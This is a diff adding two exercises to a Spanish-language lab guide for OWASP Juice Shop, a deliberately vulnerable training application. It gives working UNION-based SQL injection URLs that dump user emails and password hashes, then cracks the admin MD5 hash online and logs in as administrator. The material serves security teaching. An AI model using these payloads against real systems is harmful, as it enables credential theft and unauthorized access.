@@ -205,6 +205,104 @@ Como resultado tenemos exfiltrado todo el esquema de la base de datos, ya que la
 ![esquema](../img/lab-25-D/202211232044.png)
 
 
+## Ejercicio 3: Obtener las credenciales de todos los usuarios.
+
+***OBJETIVO***: Obtener las credenciales de todos los usuario por medio de inyección de SQL.
+
+***PISTAS***: 
+
+* En el ejercicio anterior hemos determinado que la aplicación es susceptible a ataque de inyección de SQL en el endpoint ***/rest/products/search*** usando el parámetro ***q***.
+* También verificamos que usando los caracteres ***'))--*** se podía realizar la consulta.
+* Hemos sido capaces de exfiltrar el esquema de la base de datos que usa la aplicación, y habrás comprobado hay una tabla llamada ***Users***.
+
+***RESOLUCIÓN***. Los pasos para resolver el reto son.
+
+Como habrás comprobado hay una tabla llamada ***Users***, que podemos ver en esta imagen.
+
+![Users](../img/lab-25-D/202211241756.png)
+
+En ella hay dos campos interesantes, los campos ***username*** y ***password***.
+
+Vamos a utilizar la técnica ***UNION*** para obtener todos los registros de dicha tabla.
+
+Activamos ***OWASP ZAP*** y probamos lo siguiente.
+```
+https://192.168.20.60:3000/rest/products/search?q=')) UNION SELECT '1' FROM users--
+```
+
+Obtenemos un error, así que volvemos a probar con diferentes números de columnas hasta acertar. La instrucción de inyección correcta es.
+```
+https://192.168.20.60:3000/rest/products/search?q=ewrwerwewerwerwer')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM users--
+```
+
+Como ya sabemos los campos que forman la tabla ***Users***, modificamos la consulta anterior de la siguiente forma.
+```
+https://192.168.20.60:3000/rest/products/search?q=ewrwerwewerwerwer')) UNION SELECT id, username, email, password, '5', '6', '7', '8', '9' FROM users--
+```
+
+En la siguiente imagen podemos ver los siguiente.
+
+* En el campo ***id*** de la unión tenemos el ***id*** del usuario.
+* En el campo ***name*** de la unión tenemos el ***username***, que para todos los usuarios está en blanco.
+* En el campo ***description*** de la unión tenemos el ***email***.
+* En el campo ***price*** de la unión tenemos el ***password***, que al parece está en la forma de un HASH.
+
+![Credenciales](../img/lab-25-D/202211241818.png)
+
+Las credenciales para el administrador del sitio son.
+Usuario.
+```
+admin@juice-sh.op
+```
+Hash
+```
+0192023a7bbd73250516f069df18b500
+```
+
+En el siguiente ejercicio intentaremos revertir el hash para obtener la contraseña.
+
+
+## Ejercicio 4: Iniciar sesión con el usuario administrador.
+
+***OBJETIVO***: Obtener la contraseña en texto en claro a partir de un hash.
+
+***PISTAS***: 
+
+* Usar el hash capturado en el ejercicio anterior y revertirlo en una web de tablas rainbow.
+
+***RESOLUCIÓN***. Los pasos para resolver el reto son.
+
+Los algoritmos de hashing más utilizados como NTLN, md5, sha256, etc. son algoritmos de ***puerta única***. Esto quiere decir que matemáticamente es imposible determinar la combinación de caracteres que producen un hash concreto. 
+
+Las ***Tablas Rainbow*** contienen billones que hashes precalculados, con sus respectiva combinaciones de caracteres en texto en claro. Si el número de caracteres que forman la contraseña no es muy alto (menos de 10), existe una altísima probabilidad de que la tabla rainbow contenga la combinacion de password y hash en su base de datos, lo que hace muy simple reventar las passwords.
+
+Conéctate a la siguiente web (en este caso no es necesario usar ZAP)
+```
+https://crackstation.net/
+```
+
+A continuación pega el hash del usuario administrador, que es el siguiente, y pulsa el botón ***Crack Hashes***.
+```
+0192023a7bbd73250516f069df18b500
+```
+
+![CrackStation](../img/lab-25-D/202211241838.png)
+
+Si hay suerte, tendrás el password asociado a dicho hash, que en este ejemplo es ***admin123***
+
+![Password cracked](../img/lab-25-D/202211241840.png)
+
+Para terminar el ejercicio, inicia sesión en la aplicación con el usuario.
+```
+admin@juice-sh.op
+```
+
+y password.
+```
+admin123
+```
+
+
 ***FIN DEL LABORATORIO***
 
 
